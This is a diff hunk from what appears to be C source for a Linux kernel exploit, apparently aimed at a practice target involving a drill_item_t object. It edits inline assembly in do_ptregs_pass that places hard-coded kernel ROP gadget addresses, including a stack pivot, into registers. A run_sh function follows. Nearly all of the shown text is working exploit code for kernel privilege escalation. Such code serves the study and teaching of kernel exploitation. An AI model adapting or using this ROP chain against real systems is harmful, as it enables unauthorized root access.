@@ -87,19 +87,19 @@ void do_ptregs_pass(void)
      	 * and then jump to that data via STACKPIVOT_GADGET_PTR. We need this jump to
      	 * find the drill_item_t pointer stored on the stack and jump to drill_item_t on the heap.
      	 */
-	__asm__(".intel_syntax noprefix;"
-		"mov r14, 0xffffffff810604c4;" /* : pop rax ; ret */
-		"mov r13, 0x00000000000001e0;" /* => rax */
-		"mov r12, 0xffffffff810e5abc;" /* : push rsp ; pop rsi ; pop rbx ; ret */
+	__asm__ __volatile__(".intel_syntax noprefix\n\t"
+		"mov r14, 0xffffffff810604c4\n\t" /* : pop rax ; ret */
+		"mov r13, 0x00000000000001e0\n\t" /* => rax */
+		"mov r12, 0xffffffff810e5abc\n\t" /* : push rsp ; pop rsi ; pop rbx ; ret */
 		/* hole => dummy rbx */
-		"mov rbx, 0xffffffff810040ad;" /* : pop r15 ; ret */
+		"mov rbx, 0xffffffff810040ad\n\t" /* : pop r15 ; ret */
 		/* hole => dummyy r15 */
-		"mov r10, 0xffffffff813f50d5;" /* : sub rsi, rax ; mov rax, rcx ; sub rax, rsi ; ret */
-		"mov r9, 0xffffffff812dcc30;" /*  : mov rax, qword ptr [rsi] ; ret */
-		"mov r8, 0xffffffff814d71fa;" /* : push rax ; pop rsp ; jmp 0xffffffff814d72ad
+		"mov r10, 0xffffffff813f50d5\n\t" /* : sub rsi, rax ; mov rax, rcx ; sub rax, rsi ; ret */
+		"mov r9, 0xffffffff812dcc30\n\t" /*  : mov rax, qword ptr [rsi] ; ret */
+		"mov r8, 0xffffffff814d71fa\n\t" /* : push rax ; pop rsp ; jmp 0xffffffff814d72ad
 									   <0xffffffff814d72ad> :    add    rsp,0x10
 									   <0xffffffff814d72b1> :    ret */
-		".att_syntax;");
+		".att_syntax prefix");
 }
 
 int run_sh(void)
